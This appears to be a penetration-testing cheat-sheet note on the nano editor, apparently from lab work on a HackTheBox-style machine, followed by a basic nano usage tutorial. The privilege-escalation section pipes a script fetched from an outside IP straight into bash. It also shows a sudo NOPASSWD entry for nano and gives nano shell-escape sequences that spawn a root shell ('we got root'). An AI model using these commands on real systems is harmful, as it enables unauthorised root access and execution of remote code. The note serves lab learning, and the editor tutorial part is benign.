## Description

Nano's ANOther editor, inspired by Pico.

## Usage Examples

### Escalate privileges

	curl 10.10.14.120/linpeas.sh | bash

```
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Why isn't this working? Check GTFOBins.  [^4]

This can be used to break out from restricted environments by spawning an interactive system shell:

```
nano
^R^X
reset; sh 1>&0 2>&0
```
    
The SPELL environment variable can be used in place of the -s option if the command line cannot be changed:
    
```
nano -s /bin/sh
/bin/sh
^T
```

	^R^X
	reset; sh 1>&0 2>&0	// # we got root

### Basic usage

```shell-session
  GNU nano 2.9.3                                    notes.txt                                              

Here we can type everything we want and make our notes.▓


^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify     ^C Cur Pos     M-U Undo
^X Exit        ^R Read File   ^\ Replace     ^U Uncut Text  ^T To Spell    ^_ Go To Line  M-E Redo
```

Below we see two lines with short descriptions. The `caret` (`^`) stands for our "`[CTRL]`" key. For example, if we press `[CTRL + W]`, a "`Search:`" line appears at the bottom of the editor, where we can enter the word or words we are looking for. If we now search for the word "`we`" and press `[ENTER]`, the cursor will move to the first word that matches.

```shell-session
GNU nano 2.9.3                                    notes.txt                                              

Here ▓we can type everything we want and make our notes.

Search:   notes                                                                                            
^G Get Help    M-C Case Sens  M-B Backwards  M-J FullJstify ^W Beg of Par  ^Y First Line  ^P PrevHstory
^C Cancel      M-R Regexp     ^R Replace     ^T Go To Line  ^O End of Par  ^V Last Line   ^N NextHstory
```

To jump to the next match with the cursor, we press `[CTRL + W]` again and confirm with `[ENTER]` without any additional information.

```shell-session
GNU nano 2.9.3                                    notes.txt                                              

Here we can type everything ▓we want and make our notes.

Search [we]:                                                                                               
^G Get Help    M-C Case Sens  M-B Backwards  M-J FullJstify ^W Beg of Par  ^Y First Line  ^P PrevHstory
^C Cancel      M-R Regexp     ^R Replace     ^T Go To Line  ^O End of Par  ^V Last Line   ^N NextHstory
```

Now we can save the file by pressing `[CTRL + O]` and confirm the file name with `[ENTER]`.

```shell-session
GNU nano 2.9.3                                    notes.txt                                              

Here we can type everything we want and make our notes.

File Name to Write: notes.txt▓                                                                           
^G Get Help    M-C Case Sens  M-B Backwards  M-J FullJstify ^W Beg of Par  ^Y First Line  ^P PrevHstory
^C Cancel      M-R Regexp     ^R Replace     ^T Go To Line  ^O End of Par  ^V Last Line   ^N NextHstory
```

After we have saved the file, we can leave the editor with `[CTRL + X]`.
